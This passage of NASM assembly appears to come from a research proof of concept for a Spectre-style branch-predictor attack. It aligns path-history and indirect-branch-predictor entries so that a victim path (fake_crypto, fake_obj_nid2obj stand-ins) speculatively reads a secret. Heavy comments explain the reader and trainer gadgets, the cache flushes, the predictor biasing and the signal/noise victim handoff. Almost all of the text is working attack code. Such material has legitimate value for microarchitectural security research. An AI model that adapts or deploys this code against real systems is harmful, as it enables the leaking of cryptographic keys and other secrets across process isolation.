  %error "fake_obj_nid2sn: call OBJ_nid2obj not at 0x40b291"
%endif
  call fake_obj_nid2obj                 ; 0x40b291 (5B), returns to 0x40b296
  %rep 9
    nop
  %endrep
%if ($ - fake_obj_nid2obj) != 0x13f
  %error "fake_obj_nid2sn: ret not at 0x40b29f"
%endif
  ret                                   ; 0x40b29f -> 0x42d30c

section .align_target exec
align_target:
  %rep 512
    nop
  %endrep
  ret

; ---------------------------------------------------------------------------
; M1b non-destructive reader (nd_read=1). start_reader / start_reader_train are
; byte-for-byte start_collision with ONE change: [UserData+64] points at
; reader_gadget / trainer_gadget instead of gadget. That reuses the whole real
; fake_crypto chain, so every taken branch up to and including gadget_plt's jmp
; folds into the PHR identically -- the divert happens only at the final jmp's
; target, which is pinned at the same low-16 bits as gadget (0x..5880), so even
; that fold matches. gadget's call[rax] (E2) is therefore never executed.
section .sec_start_reader exec
start_reader:
    SHIFT_PHR 195, 3
    SET_PHR 50, 3
    SERIALIZE_OPT

reader_chain_pc:
    %rep 16
      nop
    %endrep
    mov qword [rel UserData+64], reader_gadget    ; divert gadget_plt here
    mov qword [rel UserData + nd_target_off], reader_squash   ; reader_ibranch target
    clflush [rel UserData + nd_target_off]          ; isolated line -> unprefetchable
    mfence                                          ; drain the store + order the
                                                    ; clflush so the slot is a
                                                    ; GUARANTEED cold miss at the
                                                    ; indirect = resolves ~300cyc out,
                                                    ; long after the warm je squashes
    lea rdi, [rel UserData+1024]                    ; reader_gadget loads the squash
                                                    ; condition via [rdi] (WARM: a
                                                    ; fast-but-not-instant je, the
                                                    ; Goldilocks point -- a register
                                                    ; compare squashes before the
                                                    ; read even happens). rdi feeds no
                                                    ; branch in the chain, PHR intact.
    call fake_crypto_1
    %rep 512
      nop
    %endrep
    ret

section .sec_start_reader_train exec
start_reader_train:
    SHIFT_PHR 195, 4
    SET_PHR 50, 4
    SERIALIZE_OPT

reader_train_chain_pc:
    %rep 16
      nop
    %endrep
    mov qword [rel UserData+64], trainer_gadget    ; divert gadget_plt here
    mov qword [rel UserData + nd_target_off], reader_squash   ; mirror start_reader
    clflush [rel UserData + nd_target_off]          ; (trainer has no indirect; kept
    mfence                                          ;  identical for timing parity)
    lea rdi, [rel UserData+1024]                    ; condition via [rdi], warm
    call fake_crypto_1
    %rep 512
      nop
    %endrep
    ret

; reader_gadget is pinned at gadget+0x2000000, so its low 16 bits (0x5880) equal
; gadget's -- gadget_plt's jmp target folds identically. Reached with the PHR of
; the real victim path. The ONLY branch between entry and the aliasing indirect
; is the `je`, and it is PREDICTED not-taken (out-of-place trained), so at
; prediction time it folds no history: the indirect sees the same PHR as the
; victim's straight-line gadget-entry -> call[rax]. The indirect therefore
; aliases E2's IBP index and predicts the secret; the `je` then resolves taken
; and squashes it before it resolves, leaving E2 intact.
section .sec_reader_gadget exec
reader_gadget:                           ; entry 0x..5880 (low16 == gadget)
    mov r11, qword [rdi]                  ; squash condition, WARM load;          3B
    cmp r11, 1                            ; = 1 at read time (taken);             4B
reader_cbranch:
    je reader_squash                      ; SHORT (2B): target is near, below.
    ; entry+9 = 0x..5889; 2 fixed nops put reader_ibranch on E2's PC (0x..588b),
    ; and reader_align sweeps it forward from there across E2's set.
    %rep 2 + reader_align
      nop
    %endrep
reader_ibranch:
    call qword [rel UserData + nd_target_off]  ; at 0x..588b: aliases E2 -> predicts
                                           ; the secret (READ). Its target is the
                                           ; isolated cold slot, so it cannot
                                           ; resolve until ~300cyc out -> squashed
                                           ; by the warm je before it writes E2
reader_squash:                            ; architectural landing when je resolves
                                           ; taken; near enough that je stays 2B
    %rep 64
      nop
    %endrep
    ret
    %rep 1024                              ; speculation shadow / padding
      nop
    %endrep

; trainer_gadget mirrors reader_gadget up to the conditional but has NO indirect
; where reader_ibranch sits -- so training biases the shared conditional
; predictor not-taken without ever installing or touching an IBP entry at E2's
; index. Pinned at the same low-16 bits (0x5880) so its PHR and conditional PC
; alias reader_gadget's.
section .sec_trainer_gadget exec
trainer_gadget:                          ; entry 0x..5880 (same low16 as reader)
    mov r11, qword [rdi]                  ; = 0 during training -> not-taken;      3B
    cmp r11, 1                            ;                                        4B
trainer_cbranch:
    je trainer_squash                     ; SHORT (2B), identical layout to
    %rep 2 + reader_align                 ; reader_gadget so trainer_cbranch
      nop                                 ; aliases reader_cbranch
    %endrep
    %rep 6                                ; where the indirect (call, 6B) would be:
      nop                                 ; inert nops -> no IBP entry at E2's index
    %endrep
trainer_squash:
    %rep 64
      nop
    %endrep
    ret

; start_dummy_ibranch: exp-06's "force ibranch prediction to use IBP". A
; polymorphic indirect whose jmp target varies per call (dummy_tgt_0/_1 chosen by
; the randomized condition at UserData+200). Resolving it to changing targets
; keeps the indirect predictor consulting the PHR-indexed IBP for reader_ibranch
; (-> predicts E2) instead of its own last resolved target. Reached directly (no
; chain), so it is light. Uses UserData+192 (target ptr) and +200 (condition),
; both otherwise-unused. It builds its OWN distinct PHR (SHIFT_PHR, NO chain), so
; its indirect's (PHR, PC) index is provably NOT E2's -- it biases the global
; "use the IBP" confidence without aliasing or touching E2's entry.
section .sec_dummy_ibranch exec
start_dummy_ibranch:
    SHIFT_PHR 195, 5                      ; distinct PHR (cleared, no chain) so the
                                          ; dummy indirect does NOT land at E2's index
    SERIALIZE_OPT
    lea r10, [rel dummy_tgt_0]
    lea r9,  [rel dummy_tgt_1]
    cmp qword [rel UserData+200], 1
    cmovz r10, r9
    mov qword [rel UserData+192], r10
    SERIALIZE_OPT
pc_ibranch_dummy:
    jmp qword [rel UserData+192]
    %rep 512
      nop
    %endrep
dummy_tgt_0:
    %rep 64
      nop
    %endrep
    ret
dummy_tgt_1:
    %rep 64
      nop
    %endrep
    ret

section .sec_setup_trigger exec
setup_trigger:
    push rbx                 ; rbx is callee-saved (SysV ABI) and this is
                              ; called as a C function pointer from pwsc.c,
                              ; which keeps order_oracle live in rbx across
                              ; the call -- must not clobber it here
    ; rsi is the phase: 0 = noise, 1 = signal. Only the signal phase trains E1,
    ; and E1 is what makes the victim speculate into the secret-carrying gadget
    ; -- so the noise phase leaves E2 holding the attacker's own dummy_target_0.
    ; That asymmetry IS the channel; everything downstream is common-mode.
    test rsi, rsi
    jz .skip_training
  %rep train_count
    call start_collision
  %endrep
  .skip_training

  SERIALIZE_OPT

  ; Call the victim here

    ; Same widening flush as testcode: the victim's stalled strlen@plt is what
    ; opens the speculation window, and the libc code lines are shared, so they
    ; have to be cold on this side too before we hand the turn over.
    FLUSH_VICTIM_STRLEN

    ; Unconditional: the noise phase pays the same handoff as the signal phase
    ; so the victim's cache disturbance is common-mode. See the note at the top.
    ATTACKER_HANDOFF


  SERIALIZE_OPT

  %rep 512
    nop
  %endrep

    pop rbx
    ret


section .sec_trigger exec
trigger:
    push rbx                 ; rbx is callee-saved (SysV ABI). start_collision's
                             ; SERIALIZE_OPT runs `cpuid`, which clobbers ebx
                             ; with the CPUID vendor string ("Genu"). trigger is
                             ; called as a C function pointer from pwsc.c, which
                             ; holds order_oracle live in rbx across the call, so
                             ; it must be preserved (setup_trigger does the same).
                             ; One push also keeps rsp 16-aligned at the call.
  mfence
  clflush [dummy_target_0]
  clflush [fake_crypto_1]
                             ; Fires the measured collision branch in BOTH phases
                             ; so its architectural footprint cancels in
                             ; (signal - noise). The noise/signal difference is
                             ; created upstream in setup_trigger by TRAINING ORDER
                             ; (who wins the IBP entry: benign dummy vs secret),
                             ; so only the speculative walk differs here.
  call start_collision
    pop rbx
  ret

section .bss
align 4096
tlb_evict_buf: resb (got_flush_pages + 1) * 4096
